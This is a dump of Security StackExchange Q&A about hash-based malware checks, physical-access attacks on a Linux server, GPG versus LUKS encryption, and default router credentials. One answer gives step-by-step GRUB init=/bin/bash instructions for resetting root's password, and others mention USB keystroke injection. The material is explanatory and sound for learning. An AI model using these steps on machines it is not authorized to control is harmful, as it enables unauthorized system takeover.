<p><strong>What are the chances that client's file has a virus in it?</strong></p>
<p>So this is more like a hashing problem</p>
","15","9","266122","<blockquote>
<p>But I want to be sure there are no nasty viruses in these files. Is it enough if I just check the hash?</p>
</blockquote>
<p>No, cryptographically secure hashes (aka message digests) provide integrity guarantees. Which means that you get a file (e.g. document, program etc) from a <em>trusted</em> source along with its hash that was produced and is provided by the trusted source, you calculate the hash of the file yourself, compare it with the provided hash and verify whether the file was altered after it left the trusted source and before it reached you.</p>
<p>Integrity, however, does not mean that you know <em>what the program does</em>. So, you cannot tell whether a program contains a virus by checking its integrity, if you don't have a digest of the original program available to compare with (in case the program is a virus then signature based detection may apply - see below)</p>
<blockquote>
<p>For example, when I go <a href=""https://www.virustotal.com"" rel=""nofollow noreferrer"">https://www.virustotal.com</a> here and upload my file, I think it computes the hash and looks for it in the database. If the hash is clear - the file is clear. Is that true?</p>
</blockquote>
<p>Your hypothesis implies that VirusTotal has already hashed the original version of your file and has its hash stored somewhere for it to be compared with uploaded programs. However, this is not the job of antiviruses but of <a href=""https://en.wikipedia.org/wiki/File_integrity_monitoring"" rel=""nofollow noreferrer"">file integrity checkers</a>. The job of an <a href=""https://en.wikipedia.org/wiki/Antivirus_software"" rel=""nofollow noreferrer"">antivirus</a> program is to analyze files in order to identify whether the file contains malware and probably act on it. Because a file may contain malware in many forms (e.g. <a href=""https://www.trendmicro.com/vinfo/us/security/definition/Polymorphic-virus"" rel=""nofollow noreferrer"">polymorphic viruses</a>) the identification cannot be based solely on hash checking (e.g. be <a href=""https://logixconsulting.com/2020/12/15/what-is-signature-based-malware-detection/"" rel=""nofollow noreferrer"">signature based</a>) but rather on more complicated methods, with most notable being <a href=""https://analyticsindiamag.com/how-antivirus-softwares-are-evolving-with-behaviour-based-malware-detection-algorithms/"" rel=""nofollow noreferrer"">behaviour analysis</a>. Nevertheless, a virus can <a href=""https://www.hivepro.com/antivirus-evasion-techniques/"" rel=""nofollow noreferrer"">evade detection</a> by using special approaches, which makes detection hard to achieve. This means that you cannot be sure that if a virus is not detected in a file the file is not actually infected. As such, the general answer to your question is no.</p>
<blockquote>
<p>Can I add a virus and modify the file so the hash would be identical to the clean file?</p>
</blockquote>
<p><a href=""https://en.wikipedia.org/wiki/Hash_collision"" rel=""nofollow noreferrer"">In principle</a> yes. The same hash can be produced by two different blocks of data, although in cryptography it's really difficult to do it; cryprographically secure hashing algorithms are designed in such a way as to make finding collisions <a href=""https://en.wikipedia.org/wiki/Collision_resistance"" rel=""nofollow noreferrer"">very hard</a>.</p>
<p><strong>EDIT</strong>:</p>
<p>The edit in the question changes the context. The assumption is that you have an AV that can detect every virus out there. Aside from the fact that such an AV does not exist, it does not need to have a database with hashes from programs; since it can detect any virus, you can just upload any file and it will be able to say whether the file is infected or not.</p>
<p>So, having a database with hashes may provide some speed gain but you can't have a database with hashes of all available programs in the world (the space requirements would be probably unacceptable). This is especially true since files can be infected by polymorphic malware (see my answer above).</p>
","2"
"266109","266109","Is it enough to verify the hash to ensure file is virus free?","<p>I download all kinds of stuff from shady places. But I want to be sure there are no nasty viruses in these files. Is it enough if I just check the hash?</p>
<p>For example, when I go <a href=""https://www.virustotal.com"" rel=""noreferrer"">https://www.virustotal.com</a> here and upload my file, I think it computes the hash and looks for it in the database. If the hash is clear - the file is clear. Is that true?</p>
<p>Can I add a virus and modify the file so the hash would be identical to the clean file?</p>
<p>EDIT: The main goal of my question was this:</p>
<p>Suppose we have a <strong>perfect AV</strong>(find every virus) that has <code>sha256</code> database, and everyone can upload any file to it.</p>
<p>This AV scans the uploaded file and stores the hash.</p>
<p>Suppose, the client downloaded some file somewhere and calculates its <code>sha256</code> and searches the hash database.</p>
<p>The database says that there is such a hash in it, and file with that hash <strong>has no virus</strong>.</p>
<p><strong>What are the chances that client's file has a virus in it?</strong></p>
<p>So this is more like a hashing problem</p>
","15","9","266131","<p>It makes you sure that file is not manipulated or changed. But,</p>
<ul>
<li>it may be manipulated at future</li>
<li>software is malfunctioning</li>
<li>software loads another modules or calls web services that they could
be infected</li>
</ul>
","-1"
"266109","266109","Is it enough to verify the hash to ensure file is virus free?","<p>I download all kinds of stuff from shady places. But I want to be sure there are no nasty viruses in these files. Is it enough if I just check the hash?</p>
<p>For example, when I go <a href=""https://www.virustotal.com"" rel=""noreferrer"">https://www.virustotal.com</a> here and upload my file, I think it computes the hash and looks for it in the database. If the hash is clear - the file is clear. Is that true?</p>
<p>Can I add a virus and modify the file so the hash would be identical to the clean file?</p>
<p>EDIT: The main goal of my question was this:</p>
<p>Suppose we have a <strong>perfect AV</strong>(find every virus) that has <code>sha256</code> database, and everyone can upload any file to it.</p>
<p>This AV scans the uploaded file and stores the hash.</p>
<p>Suppose, the client downloaded some file somewhere and calculates its <code>sha256</code> and searches the hash database.</p>
<p>The database says that there is such a hash in it, and file with that hash <strong>has no virus</strong>.</p>
<p><strong>What are the chances that client's file has a virus in it?</strong></p>
<p>So this is more like a hashing problem</p>
","15","9","266150","<p>The most important thing that I don't see mentioned in the other answers is that a great deal of malware doesn't have a single (or a finite number) of recognizable hashes.</p>
<ul>
<li><p>There are a great number of malware that is not a single file, but travels by attaching or embedding in another file. Good luck catching it with a hash only.</p>
</li>
<li><p>There is such a thing as a polymorphic malware. Its components and padding content are shuffled every now and then so not only hash search is useless, but pattern matching is hard as well.</p>
</li>
<li><p>Finally, there is such a thing as still unknown malware. Creating a mediocre, but pretty much functional malware is easy and a lot of people do this for both fun and profit. Malware detection inevitably lags in this regard.</p>
</li>
</ul>
","2"
"266109","266109","Is it enough to verify the hash to ensure file is virus free?","<p>I download all kinds of stuff from shady places. But I want to be sure there are no nasty viruses in these files. Is it enough if I just check the hash?</p>
<p>For example, when I go <a href=""https://www.virustotal.com"" rel=""noreferrer"">https://www.virustotal.com</a> here and upload my file, I think it computes the hash and looks for it in the database. If the hash is clear - the file is clear. Is that true?</p>
<p>Can I add a virus and modify the file so the hash would be identical to the clean file?</p>
<p>EDIT: The main goal of my question was this:</p>
<p>Suppose we have a <strong>perfect AV</strong>(find every virus) that has <code>sha256</code> database, and everyone can upload any file to it.</p>
<p>This AV scans the uploaded file and stores the hash.</p>
<p>Suppose, the client downloaded some file somewhere and calculates its <code>sha256</code> and searches the hash database.</p>
<p>The database says that there is such a hash in it, and file with that hash <strong>has no virus</strong>.</p>
<p><strong>What are the chances that client's file has a virus in it?</strong></p>
<p>So this is more like a hashing problem</p>
","15","9","266163","<p>Assuming that the hash algorithm hasn't been broken yet, if two files have the same hash there's an extremely high probability (99.999999999999999999999999...% with about 75 9's) that they are the same file. So high, that we just assume they are.</p>
<p>There's no known way to add a virus to a file but keep the same SHA256 hash. Note that older algorithms such as MD5 and SHA-1 <em>have</em> been broken - that doesn't mean we know how to add a virus and keep the same hash, but it does mean we know how to do things that aren't supposed to be possible with any hash. So don't use those.</p>
<p>So if you put the SHA256 hash into Virustotal and it finds a match, that means it already scanned that exact same file. If it says no viruses detected, it means no viruses detected, in that exact same file that you downloaded.</p>
<p>It does not prove the file has no viruses, only that Virustotal didn't detect any. But that's always how it works. No virus scanner detects 100% of viruses.</p>
","0"
"266109","266109","Is it enough to verify the hash to ensure file is virus free?","<p>I download all kinds of stuff from shady places. But I want to be sure there are no nasty viruses in these files. Is it enough if I just check the hash?</p>
<p>For example, when I go <a href=""https://www.virustotal.com"" rel=""noreferrer"">https://www.virustotal.com</a> here and upload my file, I think it computes the hash and looks for it in the database. If the hash is clear - the file is clear. Is that true?</p>
<p>Can I add a virus and modify the file so the hash would be identical to the clean file?</p>
<p>EDIT: The main goal of my question was this:</p>
<p>Suppose we have a <strong>perfect AV</strong>(find every virus) that has <code>sha256</code> database, and everyone can upload any file to it.</p>
<p>This AV scans the uploaded file and stores the hash.</p>
<p>Suppose, the client downloaded some file somewhere and calculates its <code>sha256</code> and searches the hash database.</p>
<p>The database says that there is such a hash in it, and file with that hash <strong>has no virus</strong>.</p>
<p><strong>What are the chances that client's file has a virus in it?</strong></p>
<p>So this is more like a hashing problem</p>
","15","9","266183","<blockquote>
<p>I download all kinds of stuff from shady places. But I want to be sure there are no nasty viruses in these files. Is it enough if I just check the hash?</p>
</blockquote>
<p>No.</p>
<blockquote>
<p>For example, when I go <a href=""https://www.virustotal.com"" rel=""nofollow noreferrer"">https://www.virustotal.com</a> here and upload my file, I think it computes the hash and looks for it in the database. If the hash is clear - the file is clear. Is that true?</p>
</blockquote>
<p>No.</p>
<p>For starters the inverse is also not true. Just because <em>some</em> AV engine claims the file is malicious (or even just suspicious) that doesn't have to be the case. Most laypeople won't even know - let alone care about - the difference between outright malicious (malware) and PUA/PUS (potentially unwanted application/software). And if they did, they would have to decipher a very heterogeneous bunch of detection names across any number of AV engines.</p>
<p>And if they bothered to do that they'd potentially figure out that some of the <em>products</em> listed on VirusTotal share the same AV <em>engine</em> under the hood. And if a <em>single</em> engine shows a false positive but it appears, say, in three products out of four overall, that still makes &quot;only&quot; <em>two</em> false positives.</p>
<p>Last but not least an AV can only <em>find</em> or <em>not find</em> something. VirusTotal calls the latter &quot;Undetected&quot;. Undetected is not the same as clean (or good or <em>not</em> malicious).</p>
<blockquote>
<p>Can I add a virus and modify the file so the hash would be identical to the clean file?</p>
</blockquote>
<p>Theoretically yes, but it's an involved process and feasibility depends on the hash algorithm in question (e.g. if you rely on MD5 then you have relied on the wrong digest algorithm in the last ~17 years).</p>
<p>For all practical purposes this can <em>currently</em> be considered impossible for SHA-256 (your example) in particular, though.</p>
<blockquote>
<p>EDIT: The main goal of my question was this:</p>
<p>Suppose we have a perfect AV(find every virus) that has sha256 database, and everyone can upload any file to it.</p>
</blockquote>
<p>There is no such thing (perfect AV). I worked almost fifteen years in the industry and can tell you it simply doesn't exist.</p>
<p>And to stress a point <a href=""https://security.stackexchange.com/a/36758/1609"">I made elsewhere</a>: an AV that claims your system is <em>clean</em> must be using extraterrestrial technology way ahead of anything we know on this planet <em>or</em> it's using a whitelisting approach (which you can get cheaper with AppLocker/SRPs) that would prevent anything unknown by default <em>or</em> it's telling a lie (the most likely scenario).</p>
<p>What a conventional AV can claim is that <em>it hasn't found anything</em>. And there is a big difference between a clean system and one where no (known malicious) entities were found.</p>
<blockquote>
<p>This AV scans the uploaded file and stores the hash.</p>
</blockquote>
<p>If it <em>scans</em> the file what is it doing? A hash-based (whitelisting) AV would only have to have the capability to prevent files not matching hashes from its own database to run. There wouldn't have to be any heuristics, behavioral analysis (which on the endpoint is usually very limited for performance reasons), any signatures/fingerprints.</p>
<blockquote>
<p>Suppose, the client downloaded some file somewhere and calculates its sha256 and searches the hash database.</p>
<p>The database says that there is such a hash in it, and file with that hash has no virus.</p>
<p>What are the chances that client's file has a virus in it?</p>
</blockquote>
<p>The chances are mathematically <em>very</em> slim. But we've seen hash collisions during my tenure in the AV industry which is why we never relied on a single hash algorithm for <em>identification</em> (which is what you want).</p>
<blockquote>
<p>So this is more like a hashing problem</p>
</blockquote>
<p>Yes it is, but I think there is also a misunderstanding of the capabilities anti-malware can offer.</p>
<p>Similarly signing (or specifically code-signing) provide no safety from running malicious code. They attest that the signer signed a file -- and usually <em>when</em> it was signed. You'll have to trust the signer <em>and</em> the certification authorities (CAs) in the certificate chain. And if that trust gets abused there is potentially legal recourse if the CA didn't properly verify the signer prior to issuing the certificate. Signing &quot;just&quot; raises the bar quite a bit. But it's not a 100%  bulletproof guarantee that an executable whose signature checks out doesn't turn out to be malicious.</p>
<hr />
<p>Long story short: <strong>if</strong> you had different (unrelated) hash algorithms and computed the hash over a the same file using different of these algorithms, each added (unrelated) algorithm should significantly decrease the chances that you ever run into a hash collision. And consequently the chances of it being an entirely unrelated file would shrink to close to zero.</p>
<p><strong>But</strong> even if someone stored multiple such hashes of every known file, <em>someone</em> would have to pass judgment on that file first. And <em>that</em> is the weak point in your whole scheme here. <em>There are no perfect AVs.</em> And the load of samples flowing in daily is incredible. Manual analysis is left only to high-profile or otherwise interesting malware and the rest gets usually the sandbox treatment (behavioral analysis) and a number of heuristics then decide into which category a file supposedly falls.</p>
<p>False positives and false negatives exist. None of this is as perfect as in your thought experiment 😉</p>
<p>NB: I used AV (short for anti-virus) because laypeople use the term &quot;virus&quot; for malware in general. However, the term virus only refers only to a subset of the existing malware types.</p>
","-1"
"266109","266109","Is it enough to verify the hash to ensure file is virus free?","<p>I download all kinds of stuff from shady places. But I want to be sure there are no nasty viruses in these files. Is it enough if I just check the hash?</p>
<p>For example, when I go <a href=""https://www.virustotal.com"" rel=""noreferrer"">https://www.virustotal.com</a> here and upload my file, I think it computes the hash and looks for it in the database. If the hash is clear - the file is clear. Is that true?</p>
<p>Can I add a virus and modify the file so the hash would be identical to the clean file?</p>
<p>EDIT: The main goal of my question was this:</p>
<p>Suppose we have a <strong>perfect AV</strong>(find every virus) that has <code>sha256</code> database, and everyone can upload any file to it.</p>
<p>This AV scans the uploaded file and stores the hash.</p>
<p>Suppose, the client downloaded some file somewhere and calculates its <code>sha256</code> and searches the hash database.</p>
<p>The database says that there is such a hash in it, and file with that hash <strong>has no virus</strong>.</p>
<p><strong>What are the chances that client's file has a virus in it?</strong></p>
<p>So this is more like a hashing problem</p>
","15","9","266187","<h2>Not 100%.</h2>
<p>In practice, I would trust a download with a known good hash. That's how <a href=""https://en.wikipedia.org/wiki/Mainline_DHT"" rel=""nofollow noreferrer"">BitTorrent's peers share files without trackers</a>, and it's also how <a href=""https://support.microsoft.com/en-us/topic/2019-sha-2-code-signing-support-requirement-for-windows-and-wsus-64d1c82d-31ee-c273-3930-69a4cde8e64f"" rel=""nofollow noreferrer"">Windows Update</a> and Smartscreen verify the integrity of the files downloaded.</p>
<p>But in theory there are dangers:</p>
<ul>
<li>The executable might behave differently based on external factors (<a href=""https://www.freebsd.org/cgi/man.cgi?query=sha256&amp;sektion=1&amp;format=html"" rel=""nofollow noreferrer"">file name</a>, <a href=""https://www.schneier.com/blog/archives/2021/05/adding-a-russian-keyboard-to-protect-against-ransomware.html"" rel=""nofollow noreferrer"">locale</a>, <a href=""https://en.wikipedia.org/wiki/Logic_bomb"" rel=""nofollow noreferrer"">date</a>, <a href=""https://www.theguardian.com/technology/2017/may/13/accidental-hero-finds-kill-switch-to-stop-spread-of-ransomware-cyber-attack"" rel=""nofollow noreferrer"">response from third-party server</a>).</li>
<li>A file can have multiple different contents (<a href=""https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/c54dec26-1551-4d3a-a0ea-4fa40f848eb3"" rel=""nofollow noreferrer"">NTFS streams</a>). It's technically possible for other programs to load Stream #2, while you hashed Stream #1.</li>
<li><a href=""https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use"" rel=""nofollow noreferrer"">There's a gap</a> between the time you check the hash and the time you execute the file. The safe file might be replaced or modified in between (e.g. the server holds back part of the download for some time, and you hash only part of the file).</li>
<li>Not all hashes are created equal. MD5 collisions are easy to make, SHA1 is known to be unsafe, and using a safe hash but truncating it to &lt;128 bits is <a href=""https://evil32.com/"" rel=""nofollow noreferrer"">unsafe</a>.</li>
<li>You might have been tricked into visiting the wrong hash database.</li>
<li>The hash you selected and copied <a href=""https://thejh.net/misc/website-terminal-copy-paste"" rel=""nofollow noreferrer"">might not be the hash that was put in your clipboard</a>.</li>
<li><em>Virus-free</em> and <em>safe</em> are not equivalent. A well-meaning program <a href=""https://github.com/valvesoftware/steam-for-linux/issues/3671"" rel=""nofollow noreferrer"">can still wreak havoc</a>, especially if run in an unexpected environment. For example if you downloaded the executable and assets but not the installer that ensures all dependencies are present.</li>
<li>If the hash checks are automated, it has <a href=""https://en.wikipedia.org/wiki/Certificate_revocation_list#Problems_with_certificate_revocation_lists"" rel=""nofollow noreferrer"">its own can of worms</a>, for example what to do in case the hash database is unavailable.</li>
<li>Your assumption of a 100% reliable virus checker is not only unrealistic, it's impossible. I might consider adware a virus, or a computer science project might behave strange for learning purposes. The safety of a binary depends on the context it'll run, which is independent of the hash.</li>
</ul>
","0"
"266048","266048","What can an attacker do with physical access to a Linux server?","<p>I have physical access to a Linux computer (Ubuntu 20.04). My colleague asked me what an attacker could do if he had physical access to this computer?</p>
<p>I would like to know if, by default (after a fresh installation), it is possible to plug a USB into the computer and steal data (the computer is always running)?</p>
<p>Otherwise, what other malicious things could an attacker do?</p>
","0","3","266049","<p>This depends on the level of hardening. Having physical access to a Linux server generally means one is able to reboot it.</p>
<p>Next, when the Grub screen appears select &quot;Advanced options&quot;. At this point you can edit the commands by pressing &quot;e&quot;.</p>
<p>Find the line that starts with &quot;Linux&quot; and change the read only mode to read write mode. At the end of the line add <code>init=/bin/bash</code></p>
<p>By pressing F10, you should be in a terminal. At this point you only need to mount the root file system in read/write mode:</p>
<pre><code>mount -n -o remount,rw /
</code></pre>
<p>Now type <code>passwd</code> and enter a new root password, reboot the machine and use the new root password for full access.</p>
<blockquote>
<p>I would like to know if, by default (after a fresh installation), it
is possible to plug a USB into the computer and steal data</p>
</blockquote>
<p>Yes, if the server has USB ports, it certainly is possible to plugin a USB device. However, stealing data requires access to at least the terminal with root privileges, which can be obtained as described above.</p>
","2"
"266048","266048","What can an attacker do with physical access to a Linux server?","<p>I have physical access to a Linux computer (Ubuntu 20.04). My colleague asked me what an attacker could do if he had physical access to this computer?</p>
<p>I would like to know if, by default (after a fresh installation), it is possible to plug a USB into the computer and steal data (the computer is always running)?</p>
<p>Otherwise, what other malicious things could an attacker do?</p>
","0","3","266053","<blockquote>
<p>what other malicious things could an attacker do?</p>
</blockquote>
<p>Since there isn't any security measure in place the answer is <em>a lot</em>.</p>
<p>The simplest thing is rebooting the system and gaining root access (as described by <a href=""https://security.stackexchange.com/users/59503/jeroen"">@Jeroen</a>). This is the oldest trick in the book. After an attacker gains root privileges, then it's free rein for them.</p>
<p>Advanced attacks are also possible (depending on whose target you are), such as the <a href=""https://en.wikipedia.org/wiki/Evil_maid_attack"" rel=""nofollow noreferrer"">evil maid</a> attack and in some cases installing <a href=""https://en.wikipedia.org/wiki/Hardware_keylogger"" rel=""nofollow noreferrer"">hardware keyloggers</a>.</p>
<p>Keep in mind that physical access to an asset from an adversary is considered the worst scenario for security because there are unlimited things to do in order to circumvent any protection measures - from installing cameras to keyloggers to stealing the computer itself.</p>
<p><strong>EDIT:</strong></p>
<blockquote>
<p>But if the machine has no keyboard/mouse but only USB ports (we can only plug USB keys and nothing else), is it not possible to steal data or something else?</p>
</blockquote>
<p>Even though more complicated, because it requires some knowledge of the system (e.g. account credentials, where your data is located etc), it is still possible to steal data by only plugging in a usb device. There's the <a href=""https://learn.adafruit.com/the-foul-fowl-keyboard-injection-payload-gemma-m0"" rel=""nofollow noreferrer"">USB keystroke injection</a> attack, in which a usb drive can pose as a keyboard to the OS and run commands (see for example <a href=""https://docs.hak5.org/hak5-usb-rubber-ducky/"" rel=""nofollow noreferrer"">rubber ducky</a>). It is much more difficult to execute due to the amount of info a person requires in order for the attack to be successful, but it is an applicable attack.</p>
","2"
"266048","266048","What can an attacker do with physical access to a Linux server?","<p>I have physical access to a Linux computer (Ubuntu 20.04). My colleague asked me what an attacker could do if he had physical access to this computer?</p>
<p>I would like to know if, by default (after a fresh installation), it is possible to plug a USB into the computer and steal data (the computer is always running)?</p>
<p>Otherwise, what other malicious things could an attacker do?</p>
","0","3","266067","<p>While there will be trade offs of time, access, and resources; the short answer is <strong>Complete Compromise</strong>.</p>
<p>Your title says <em>SERVER</em>, so it's reasonable to assume disk encryption is not a factor as servers are rarely encrypted due to the need to be able to auto restart without manual intervention.</p>
<p>Depending upon other unstated parameters:</p>
<ul>
<li>Complete drive-to-drive imaging can be performed in a few hours.</li>
<li>An external network tap can be inserted. (<em>Is there a network?</em>)</li>
<li>Open it up and insert an internal tap</li>
<li>Open it up and insert another drive <em>to be retrieved later?</em></li>
<li>Install remote access code.</li>
</ul>
<p>There are many other possibilities that trade time and convenience, but complete compromise is possible, it just may be slow or fast depending on practical restrictions.</p>
","1"
"266037","266037","Which one is safer for persistent online data? Gpg per file encryption vs gpg encrypted image vs LUKS2 image","<p>3 people need to share some data through cloud. The total amount of data is small (&lt;5gb in total). The update rate is very low, 1 per month. The cloud has very limited security measures so we consider all the files stored in it are public exposed.</p>
<p>Then we would like to encrypt the files or an small disk image (6-8gb). There are 3 options:</p>
<ol>
<li>We can encrypted hundreds files by 3 public keys.</li>
<li>We can put files in a ext4 or btrfs image then encrypt it with 3 public keys.</li>
<li>We can use luks2 image with detached header. Everyone can hold a copy of the header and a pwd to a slot. The header and keys are distributed offline.</li>
</ol>
<p>Let's assume the users' local systems are bulletproof.</p>
<p>Personally I would say 1st is more robust because it is unlikely all files are corrupted at the same time.</p>
<p>However, here I do not want to discuss the robustness or convince. We do not care if the decryption and encryption can be slower. I would like to know which one is the most difficult one to defeat.</p>
<p>I often saw people were trying to use GPU to crack the luks partition since it is using some master key to encrypt bloks and the info stored in the first sector can help it even if one choose detached header. I do not know how hard it can be if one can use lots of GPUs to crack it. Can they normally crack it in months or in years? Luks in general is ok for disk encryption because once the disk is stolen we can respond to it: start to change credentials to invalid as much as possible the information contained in the disk as an example. But for a cloud stored image we do not know when to react.</p>
<p>Can gpg encryption be harder to crack with GPU? Does it make difference if there are multiple files or just a single image? If someone cracked a single file or obtained clear text of one file, does it mean they can crack other files easier encrypt by the same gpg key? I think it should not be the case. But I can be wrong. In general I think luks made lots of compromise to speed it up, so encrypting files by gpg will be stronger. But to what extent?</p>
","1","3","266039","<p>You have quite a bit of confusion to work through here:</p>
<p>&quot;<em>... 3 people need to share some data ... then encrypt it with 3 gpg keys ...</em>&quot;</p>
<p>You seem to be implying that <strong>Public Key</strong> cryptography is needed/desired by stating 3 gpg keys?</p>
<p><em>&quot;... We can use luks2 image ...</em>&quot;</p>
<p>This suggests that Public Key cryptography is <strong>not</strong> required?</p>
<p>Let's back up a bit:</p>
<p><em>&quot;...Can gpg encryption be harder to crack with GPU?...&quot;</em></p>
<p>GPG is an encryption <strong>toolbox</strong>, it is not an encryption algorithm! GPG is capable of producing both Public and Symmetric encryption. The underlying encryption algorithms are well known and highly vetted.</p>
<p><em>&quot;... I think luks made lots of compromise to speed it up, so encrypting files by gpg will be stronger ...&quot;</em></p>
<p>LUKS is a <strong>container</strong>, it is not an encryption algorithm! Within a LUKS container selected encryption is applied. The default encryption used now is AES-256, I think but haven't looked in quite awhile.</p>
<p>My recommendation, based upon your less than clear description, is that you use <strong>Veracrypt</strong>! This will allow you to merge multiple files into a single encrypted container, use multiple encrypted containers for different files, or whatever. It's also compatible across many operating systems. Veracrypt is a container, you may choose the encryption.</p>
","0"
"266037","266037","Which one is safer for persistent online data? Gpg per file encryption vs gpg encrypted image vs LUKS2 image","<p>3 people need to share some data through cloud. The total amount of data is small (&lt;5gb in total). The update rate is very low, 1 per month. The cloud has very limited security measures so we consider all the files stored in it are public exposed.</p>
<p>Then we would like to encrypt the files or an small disk image (6-8gb). There are 3 options:</p>
<ol>
<li>We can encrypted hundreds files by 3 public keys.</li>
<li>We can put files in a ext4 or btrfs image then encrypt it with 3 public keys.</li>
<li>We can use luks2 image with detached header. Everyone can hold a copy of the header and a pwd to a slot. The header and keys are distributed offline.</li>
</ol>
<p>Let's assume the users' local systems are bulletproof.</p>
<p>Personally I would say 1st is more robust because it is unlikely all files are corrupted at the same time.</p>
<p>However, here I do not want to discuss the robustness or convince. We do not care if the decryption and encryption can be slower. I would like to know which one is the most difficult one to defeat.</p>
<p>I often saw people were trying to use GPU to crack the luks partition since it is using some master key to encrypt bloks and the info stored in the first sector can help it even if one choose detached header. I do not know how hard it can be if one can use lots of GPUs to crack it. Can they normally crack it in months or in years? Luks in general is ok for disk encryption because once the disk is stolen we can respond to it: start to change credentials to invalid as much as possible the information contained in the disk as an example. But for a cloud stored image we do not know when to react.</p>
<p>Can gpg encryption be harder to crack with GPU? Does it make difference if there are multiple files or just a single image? If someone cracked a single file or obtained clear text of one file, does it mean they can crack other files easier encrypt by the same gpg key? I think it should not be the case. But I can be wrong. In general I think luks made lots of compromise to speed it up, so encrypting files by gpg will be stronger. But to what extent?</p>
","1","3","266046","<p>It seems there's some confusion between the tools and the underlying encryption algorithms that they employ.</p>
<p>GnuPG, LUKS, openssl, gnutls and all the encryption tools out there, generally use the same cryptographic algorithms. The only difference among them is that each tool is designed to solve a specific problem, e.g. (although not exclusively) gnupg for emails, luks for disk encryption, openssl/gnutls for https etc.</p>
<p>As such, if someone has the capability to break the encryption used e.g. in gnupg, she will generally be able to break the encryption used in luks and openssl.</p>
<blockquote>
<p>I would like to know which one is the most difficult one to defeat</p>
</blockquote>
<p>Depends on what do you mean by defeat. If you mean cracking the encryption algorithms, then they are equally difficult to be cracked</p>
<blockquote>
<p>Can they normally crack it in months or in years?</p>
</blockquote>
<p>Depends on the key (type, size and complexity). The simpler the key, the faster it can be found</p>
<blockquote>
<p>Can gpg encryption be harder to crack with GPU?</p>
</blockquote>
<p>For type-depending-large enough asymmetric keys, cracking is <a href=""https://en.wikipedia.org/wiki/Computational_complexity_theory#Intractability"" rel=""nofollow noreferrer"">intractable</a>. For symmetric keys it depends on the key (as above)</p>
<blockquote>
<p>Does it make difference if there are multiple files or just a single image?</p>
</blockquote>
<p>From a cryptographic point of view, if we consider the underlying encryption algorithm to be secure, then there shouldn't be any difference</p>
<blockquote>
<p>If someone cracked a single file or obtained clear text of one file, does it mean they can crack other files easier encrypt by the same gpg key?</p>
</blockquote>
<p>Normally no, if the underlying algorithm is secure and respects <a href=""https://en.wikipedia.org/wiki/Kerckhoffs%27s_principle"" rel=""nofollow noreferrer"">Kerckhoff's principle</a></p>
","0"
"266037","266037","Which one is safer for persistent online data? Gpg per file encryption vs gpg encrypted image vs LUKS2 image","<p>3 people need to share some data through cloud. The total amount of data is small (&lt;5gb in total). The update rate is very low, 1 per month. The cloud has very limited security measures so we consider all the files stored in it are public exposed.</p>
<p>Then we would like to encrypt the files or an small disk image (6-8gb). There are 3 options:</p>
<ol>
<li>We can encrypted hundreds files by 3 public keys.</li>
<li>We can put files in a ext4 or btrfs image then encrypt it with 3 public keys.</li>
<li>We can use luks2 image with detached header. Everyone can hold a copy of the header and a pwd to a slot. The header and keys are distributed offline.</li>
</ol>
<p>Let's assume the users' local systems are bulletproof.</p>
<p>Personally I would say 1st is more robust because it is unlikely all files are corrupted at the same time.</p>
<p>However, here I do not want to discuss the robustness or convince. We do not care if the decryption and encryption can be slower. I would like to know which one is the most difficult one to defeat.</p>
<p>I often saw people were trying to use GPU to crack the luks partition since it is using some master key to encrypt bloks and the info stored in the first sector can help it even if one choose detached header. I do not know how hard it can be if one can use lots of GPUs to crack it. Can they normally crack it in months or in years? Luks in general is ok for disk encryption because once the disk is stolen we can respond to it: start to change credentials to invalid as much as possible the information contained in the disk as an example. But for a cloud stored image we do not know when to react.</p>
<p>Can gpg encryption be harder to crack with GPU? Does it make difference if there are multiple files or just a single image? If someone cracked a single file or obtained clear text of one file, does it mean they can crack other files easier encrypt by the same gpg key? I think it should not be the case. But I can be wrong. In general I think luks made lots of compromise to speed it up, so encrypting files by gpg will be stronger. But to what extent?</p>
","1","3","266052","<p><strong>TLDR:</strong> From the cryptographic perspective, all your approaches can provide the same strength. The main difference is usability.</p>
<p>All of the named methods can use AES, which is considered non-breakable. Non-breakable means that even if you use the computing power in the whole world, the brute-forcing will take much more time than the Universe exists.</p>
<p>AES is resistant to preimage attacks. Means, even if the attacker knows the contents of some files before and after encryption, it will not help to find the encryption key. From this perspective there is no difference if you use a single file or image as a container or if you encrypt thousands or millions of files separately.</p>
<p>If you encrypt and store each file separately, the attacker will know how many files are there and how big they are. This can give the attacker an information about what kind of data are encrypted (with high <em>probability</em>, but still not 100% sure), e.g. do the files contain images, or videos, or a e-books, or saved web page, etc. In case of LUKS such information is not available to the attacker. Only you know, if disclosing such information about your files makes any risk to you.</p>
<p>Creating backups in case 1 is much easier. You can check what has changed and each time backup only changed files. To create backups you don't need to know the key and thus it can be easier to implement.</p>
<p>In case of LUKS, for backups you would need to encrypt/decrypt the whole partition. You can optimize backups slightly if you use <em>btrfs</em>. But still you have to deal with the whole partition.</p>
<p>When you encrypt every file separately, the file system remains unencrypted. You can forget to encrypt some file and save it there in the plain form. Only you know, if this is an important risk to you. If this is a risk, then you may prefer LUKS, because in that case you don't need to think about encryption all the time. You can put files there from any application like MS Office or Email client, and they will be automatically encrypted.</p>
","2"
"266033","266033","Why does having default router credentials pose a risk?","<p>When I got to 192.168.0.1/login I am greeted with my router login page and can go change some settings. Now let's say I still have the factory default login something like &quot;admin&quot;, &quot;admin&quot;.</p>
<p>Can an attacker exploit this even while not connected to my network? Does this only pose a risk if an attacker knows my wifi password first?</p>
","1","3","266034","<p>If an attacker gets access to a computer on the network (malware, remote code execution, uninformed user giving remote access, etc) getting access to the router may be the next step in escalation.</p>
<p>For example they may be able to configure a VPN which gives them broader access to the network.  Or they may use it to install malware on the router itself.</p>
<p>Keeping access to an infected network is important for ongoing attack and a router is a fantastic way to do that.</p>
","2"
"266033","266033","Why does having default router credentials pose a risk?","<p>When I got to 192.168.0.1/login I am greeted with my router login page and can go change some settings. Now let's say I still have the factory default login something like &quot;admin&quot;, &quot;admin&quot;.</p>
<p>Can an attacker exploit this even while not connected to my network? Does this only pose a risk if an attacker knows my wifi password first?</p>
","1","3","266042","<blockquote>
<p>Why does having default router credentials pose a risk?</p>
</blockquote>
<p>Default credentials mean that anyone knows them and can use them to gain access to the device. This is bad enough, let alone if they provide admin level access.</p>
<p>Assuming you meant a <em>home DSL wireless</em> router, a router is usually a device that combines <em>a switch</em> (can jack in a couple of computers, usually 4), <em>DSL gateway</em> (connects to the ISP through your phone line), <em>WLAN</em> (WiFi network) and some other, optional, functionalities (DNS resolution, DHCP server, firewall etc).</p>
